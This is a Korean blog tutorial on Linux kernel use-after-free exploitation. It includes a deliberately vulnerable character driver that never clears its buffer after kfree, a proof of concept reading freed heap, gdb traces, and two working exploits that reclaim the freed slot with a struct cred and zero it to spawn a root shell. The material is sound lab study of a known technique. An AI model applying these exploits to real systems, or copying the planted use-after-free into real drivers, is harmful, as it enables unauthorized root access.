---
title: Use After Free with struct cred
author: Beomsu Lee
category: [Exploitation, Kernel]
tags: [exploitation, kernel, use after free]
math: true
mermaid: true
---

## kmalloc, kfree

`kmalloc()`, `kfree()` 함수는 kernel 영역에 Heap 메모리를 할당, 해제하는 함수이다.

## kmalloc()

첫번째 인자 값은 할당할 메모리(Heap)의 크기를 전달한다. 두번째 인자 값은 할당할 메모리(Heap)의 유형을 전달한다.

```
void *kmalloc(size_t size, gfp_t flags);
```

## kfree()

`kmalloc()`에 의해 반환된 포인터 주소를 전달한다.

```c
void kfree(const void * objp);
```

## Set Environment

## chardev_ioctl()

KMALLOC 분기문을 이용하여 `kmalloc()` 함수를 호출한다.

- 메모리의 크기는 유저 프로그램으로부터 전달받은 값 사용(arg)
- 할당된 메모리 포인터는 info.buf 변수에 저장됨

KFREE 분기문을 이용하여 `kfree()` 함수를 호출한다.

- info.buf 변수에 저장된 값이 0이 아닐 경우에 `kfree()` 실행
- `kfree()` 함수는 info.buf 변수에 저장된 영역 해제

## chardev_write()

`info.buf` 변수에 저장된 값이 0이 아니고 count 보다 큰 경우 `copy_from_user(info.buf, buf, count)` 실행한다.

```c
// chardev.c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/types.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/sched.h>
#include <linux/device.h>
#include <linux/slab.h>
#include <asm/current.h>
#include <linux/uaccess.h>
#include <linux/cred.h>
      
#include "chardev.h"
MODULE_LICENSE("Dual BSD/GPL");
      
#define DRIVER_NAME "chardev"
          
static const unsigned int MINOR_BASE = 0;
static const unsigned int MINOR_NUM  = 1;
static unsigned int chardev_major;
static struct cdev chardev_cdev;
static struct class *chardev_class = NULL;
     
static int     chardev_open(struct inode *, struct file *);
static int     chardev_release(struct inode *, struct file *);
static ssize_t chardev_read(struct file *, char *, size_t, loff_t *);
static ssize_t chardev_write(struct file *, const char *, size_t, loff_t *);
static long chardev_ioctl(struct file *, unsigned int, unsigned long);
     
struct file_operations s_chardev_fops = {
    .open    = chardev_open,
    .release = chardev_release,
    .read    = chardev_read,
    .write   = chardev_write,
    .unlocked_ioctl = chardev_ioctl,
};
     
static int chardev_init(void)
{
    int alloc_ret = 0;
    int cdev_err = 0;
    int minor = 0;
    dev_t dev;
      
    printk("The chardev_init() function has been called.\n");
          
    alloc_ret = alloc_chrdev_region(&dev, MINOR_BASE, MINOR_NUM, DRIVER_NAME);
    if (alloc_ret != 0) {
        printk(KERN_ERR  "alloc_chrdev_region = %d\n", alloc_ret);
        return -1;
    }
    //Get the major number value in dev.
    chardev_major = MAJOR(dev);
    dev = MKDEV(chardev_major, MINOR_BASE);
      
    //initialize a cdev structure
    cdev_init(&chardev_cdev, &s_chardev_fops);
    chardev_cdev.owner = THIS_MODULE;
      
    //add a char device to the system
    cdev_err = cdev_add(&chardev_cdev, dev, MINOR_NUM);
    if (cdev_err != 0) {
        printk(KERN_ERR  "cdev_add = %d\n", alloc_ret);
        unregister_chrdev_region(dev, MINOR_NUM);
        return -1;
    }
      
    chardev_class = class_create(THIS_MODULE, "chardev");
    if (IS_ERR(chardev_class)) {
        printk(KERN_ERR  "class_create\n");
        cdev_del(&chardev_cdev);
        unregister_chrdev_region(dev, MINOR_NUM);
        return -1;
    }
      
    device_create(chardev_class, NULL, MKDEV(chardev_major, minor), NULL, "chardev%d", minor);
    return 0;
}
      
static void chardev_exit(void)
{
    int minor = 0;
    dev_t dev = MKDEV(chardev_major, MINOR_BASE);
          
    printk("The chardev_exit() function has been called.\n");
     
    device_destroy(chardev_class, MKDEV(chardev_major, minor));
      
    class_destroy(chardev_class);
    cdev_del(&chardev_cdev);
    unregister_chrdev_region(dev, MINOR_NUM);
}
 
static struct ioctl_info info; 
static int chardev_open(struct inode *inode, struct file *file)
{
    printk("The chardev_open() function has been called.\n");
    printk("Address of &info.buf : %p\n",&info.buf);
    info.buf=0;
    return 0;
}
      
static int chardev_release(struct inode *inode, struct file *file)
{
    printk("The chardev_close() function has been called.\n");
    return 0;
}
      
static ssize_t chardev_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos)
{
    printk("The chardev_write() function has been called.");  
    if(info.buf){
        if(info.size > count){
            if(copy_from_user(info.buf, buf, count) != 0){
                return -EFAULT;
            }
        }
    }
    return count;
}
      
static ssize_t chardev_read(struct file *filp, char __user *buf, size_t count, loff_t *f_pos)
{
    printk("The chardev_read() function has been called.\n");
    if (info.buf){
        if(info.size > count){
            if(copy_to_user(buf, info.buf, count) != 0){
                 return -EFAULT;
            }
        }
    }
    return count;
}
      
static long chardev_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)
{
    printk("The chardev_ioctl() function has been called.\n");
      
    switch (cmd) {
    case KMALLOC:
        if(!info.buf){
            printk("Address of info.buf : %p\n",info.buf);
            info.size = (size_t)arg;
            info.buf = (char *)kmalloc(info.size, GFP_KERNEL);
 
            if (!info.buf){
                printk("Error!\n");
            }else{
                printk("Address of info.buf : %p\n",info.buf);
                printk("Success!\n");
            }
        }
        break;
    case KFREE:
        if(info.buf){
            printk("Call the kfree(). info.buf %p\n",info.buf);
            kfree(info.buf);
        }
        break;
    default:
        printk(KERN_WARNING "unsupported command %d\n", cmd);
        return -EFAULT;
    }
    return 0;
}
     
module_init(chardev_init);
module_exit(chardev_exit);
```

```c
// chardev.h
#ifndef CHAR_DEV_H_
#define CHAR_DEV_H_
#include <linux/ioctl.h>
     
struct ioctl_info{
       unsigned long size;
       char *buf;
};
  
#define             IOCTL_MAGIC         'G'
#define             SET_DATA            _IOW(IOCTL_MAGIC, 2 ,struct ioctl_info)
#define             GET_DATA            _IOR(IOCTL_MAGIC, 3 ,struct ioctl_info)
#define             KMALLOC             _IOW(IOCTL_MAGIC, 4, size_t)
#define             KFREE               _IO(IOCTL_MAGIC, 0)
#endif
```

## Proof of concept

`kfree()` 함수 호출 후 uaf 취약점을 통해 읽어오는 메모리 영역은 앞에서 해제된 커널의 heap 영역이다.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include "chardev.h"
#define SIZE 128
int main(){
    int fd;
    char info[SIZE];
    fd = open("/dev/chardev0",O_RDWR);
    if(fd < 0){
        perror("open error");
        exit(-1);
    }
    if(ioctl(fd,KMALLOC,SIZE) < 0){
        perror("ioctl error");
        exit(-1);
    }
    //write(fd,"AAAA",0x4);
    if(ioctl(fd,KFREE) < 0){
        perror("ioctl error");
        exit(-1);
    }
    memset(info,0,SIZE);
    read(fd,info,SIZE-1);
    int i,j;
    for(i=0;i<sizeof(info);i++){
        if(i%0x10==0) printf("\n");
        printf("%02x ",info[i] & 0xff);
    }
    //for(i=0;i<sizeof(info)/8;i++){
    //    for(j=0;j<8;j++){
    //        printf("%02x ",info[i*8+j] & 0xff);
    //    }    
    //    printf("\n");
    //} 
    printf("\n");
    if(close(fd) < 0){
        perror("close error");
        exit(-1);
    }
    
    return 0;
}
```

`kmalloc()`으로 heap 영역을 할당한다.

```
1: x/i $rip
=> 0xffffffffc01231c5:  callq  0xffffffff811dcbe0 <__kmalloc>
(gdb) ni
0xffffffffc01231ca in ?? ()
1: x/i $rip
=> 0xffffffffc01231ca:  test   %rax,%rax
(gdb) info r rax
rax            0xffff8800bbacf100 <- 커널의 heap 영역 할당 -131938246659840
```

`kfree()`로 heap 영역 해제한다.

```
1: x/i $rip
=> 0xffffffffc012319d:  callq  0xffffffff811dd600 <kfree>
(gdb) info r rdi
rdi            0xffff8800bbacf100  -131938246659840
```

`chardev_read()` 함수의 `_copy_to_user()`에 해제된 heap 영역 전달한다.

```
1: x/i $rip
=> 0xffffffffc0123102:  callq  0xffffffff813e09e0 <_copy_to_user>
(gdb) info r
rax            0x2c                44
rbx            0x7f                127
rcx            0x0                 0
rdx            0x7f                127
rsi            0xffff8800bbacf100  -131938246659840
rdi            0x7fff43ebd420      140734332916768
```

유저 영역으로 전달된 heap 영역이다. uaf 취약점이 발생한다.

```
bs@bs-virtual-machine:~/Desktop$ ./test 
80 7e 76 24 01 88 ff ff 00 00 00 00 00 00 00 00 
02 00 3e 00 01 00 00 00 f0 06 40 00 00 00 00 00 
40 00 00 00 00 00 00 00 b8 11 00 00 00 00 00 00 
00 00 00 00 40 00 38 00 09 00 40 00 1e 00 1b 00 
7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
03 00 3e 00 01 00 00 00 d0 12 00 00 00 00 00 00 
40 00 00 00 00 00 00 00 c0 40 02 00 00 00 00 00 
00 00 00 00 40 00 38 00 07 00 40 00 17 00 16 00
```

### Exploit plan 1

1. `kmalloc()` 함수를 이용해 원하는 크기의 힙 메모리 영역을 할당
2. `kfree()` 함수를 이용해 할당받은 메모리 영역 해제
3. `fork()` 함수를 이용해 child 프로세스 생성
    - 새로운 프로세스가 실행되며, 해당 프로세스의 자격증명을 위해 생성되는 `struct cred`가 해제된 heap 영역에 할당됨
4. uaf 취약점을 이용해 `struct cred` 값 변경

**`struct cred`의 크기**

```
(gdb) p sizeof(struct cred)
$3 = 168
```

### Exploit 1

```c
// gcc exploit.c -o exploit
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include "chardev.h"

#define SIZE 168

int main(){
    int fd,pid,i,j;
    char info[SIZE];

    fd = open("/dev/chardev0",O_RDWR);
    if(fd < 0){
        perror("open error");
        exit(-1);
    }

    if(ioctl(fd,KMALLOC,SIZE) < 0){
        perror("ioctl error");
        exit(-1);
    }
    //write(fd,"AAAA",0x4);
    if(ioctl(fd,KFREE) < 0){
        perror("ioctl error");
        exit(-1);
    }

    // memset(info,0,SIZE);
    // read(fd,info,SIZE-1);

    for(i=0;i<sizeof(info);i++){
        if(i%0x10==0) printf("\n");
        printf("%02x ",info[i] & 0xff);
    }
    printf("\n");

    pid = fork();
    if(pid < 0){
        perror("fork error");
    }else if(pid == 0){
        char zeros[30] = {0};
        write(fd,zeros,30);
        if(getuid() == 0){
            printf("[+] root now.\n");
            system("/bin/sh");
            exit(0);
        }else{
            printf("UID: %d\n",getuid()); 
        }
    }else{
        wait(1);
    }

    if(close(fd) < 0){
        perror("close error");
        exit(-1);
    }
    
    return 0;
}
```

## Exploit

```
bs@bs-virtual-machine:~/Desktop$ ./exploit 
00 00 00 00 00 00 00 00 80 d0 e6 85 00 88 ff ff 
00 00 00 00 00 00 00 00 00 01 00 00 00 00 ad de 
00 02 00 00 00 00 ad de 00 01 00 00 00 00 ad de 
00 02 00 00 00 00 ad de 00 01 00 00 00 00 ad de 
00 02 00 00 00 00 ad de 01 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
01 00 00 00 00 00 00 00 c0 80 4c b9 00 88 ff ff 
80 d0 e6 85 00 00 00 00 00 00 40 b2 00 88 ff ff 
00 10 00 00 00 00 00 00 08 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
[+] root now.
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare),1000(bs)
```

자격증명이 `_copy_from_user()` 함수 호출 후 1000 -> 0 으로 변경된다.

```
1: x/i $rip
=> 0xffffffffc025e0a2:  call   0xffffffff813e0a10 <_copy_from_user>
(gdb) p *(struct cred*)$rdi
$4 = {usage = {counter = 2}, uid = {val = 1000}, gid = {val = 1000}, suid = {
    val = 1000}, sgid = {val = 1000}, euid = {val = 1000}, egid = {
    val = 1000}, fsuid = {val = 1000}, fsgid = {val = 1000}, securebits = 0, 
cap_inheritable = {cap = {0, 0}}, cap_permitted = {cap = {0, 0}}, 
cap_effective = {cap = {0, 0}}, cap_bset = {cap = {4294967295, 63}}, 
cap_ambient = {cap = {0, 0}}, jit_keyring = 0 '\000', 
session_keyring = 0x0 <irq_stack_union>, 
process_keyring = 0x0 <irq_stack_union>, 
thread_keyring = 0x0 <irq_stack_union>, 
request_key_auth = 0x0 <irq_stack_union>, security = 0xffff880077d6c380, 
user = 0xffff8800bb828c80, user_ns = 0xffffffff81c44ae0 <init_user_ns>, 
group_info = 0xffff8800ace62540, rcu = {next = 0x0 <irq_stack_union>, 
    func = 0x0 <irq_stack_union>}}
(gdb) ni
0xffffffffc025e0a7 in ?? ()
1: x/i $rip
=> 0xffffffffc025e0a7:  test   rax,rax
(gdb) p *(struct cred*)$rdi
$5 = {usage = {counter = 65536000}, uid = {val = 0}, gid = {val = 0}, suid = {
    val = 0}, sgid = {val = 0}, euid = {val = 0}, egid = {val = 0}, fsuid = {
    val = 0}, fsgid = {val = 4294901760}, securebits = 4194303, 
cap_inheritable = {cap = {0, 0}}, cap_permitted = {cap = {0, 0}}, 
cap_effective = {cap = {0, 0}}, cap_bset = {cap = {0, 0}}, cap_ambient = {
    cap = {0, 0}}, jit_keyring = 0 '\000', 
session_keyring = 0x880077d6c3800000, process_keyring = 0x8800bb828c80ffff, 
thread_keyring = 0xffff81c44ae0ffff, request_key_auth = 0x8800ace62540ffff, 
security = 0xffff <ftrace_stack+2911>, user = 0x0 <irq_stack_union>, 
user_ns = 0x0 <irq_stack_union>, group_info = 0x0 <irq_stack_union>, rcu = {
    next = 0x0 <irq_stack_union>, func = 0x880090f4c1800000}}
```

### Exploit plan 2

1. 2개의 드라이버 파일 `open(fd1, fd2)`
2. `fd1`을 이용하여 `cred` 구조체만큼 크기의 heap 할당
3. `fd1`의 할당한 메모리 해제
4. `close(fd1)`
5. `read(fd2,…)`을 이용해 `fd1`에 의해 할당 및 해제된 heap 영역의 값을 `write()`
    - `info.buf` 변수의 구조체는 동일함

## Exploit code

```c
// gcc exploit.c -o exploit
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include "chardev.h"

#define SIZE 168

int main(){
    int fd1,fd2,pid,i,j;
    char info[SIZE];

    fd1 = open("/dev/chardev0",O_RDWR);
    fd2 = open("/dev/chardev0",O_RDWR);
    if(fd1 < 0 || fd2 < 0){
        perror("open error");
        exit(-1);
    }

    if(ioctl(fd1,KMALLOC,SIZE) < 0){
        perror("ioctl error");
        exit(-1);
    }
    //write(fd,"AAAA",0x4);
    if(ioctl(fd1,KFREE) < 0){
        perror("ioctl error");
        exit(-1);
    }
    if(close(fd1) < 0){
        perror("close error");
        exit(-1);
    }

    pid = fork();
    if(pid < 0){
        perror("fork error");
    }else if(pid == 0){
        char zeros[30] = {0};
        write(fd2,zeros,30);
        if(getuid() == 0){
            printf("[+] root now.\n");
            system("/bin/sh");
            exit(0);
        }else{
            printf("UID: %d\n",getuid()); 
        }
    }else{
        wait(1);
    }

    close(fd2);

    return 0;
}
```

## Exploit

```bash
bs@bs-virtual-machine:~/Desktop$ ./test 
[+] root now.
# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare),1000(bs)
```

## References
- [06.Use-After-Free(UAF) (feat.struct cred)](https://www.lazenca.net/pages/viewpage.action?pageId=25624864)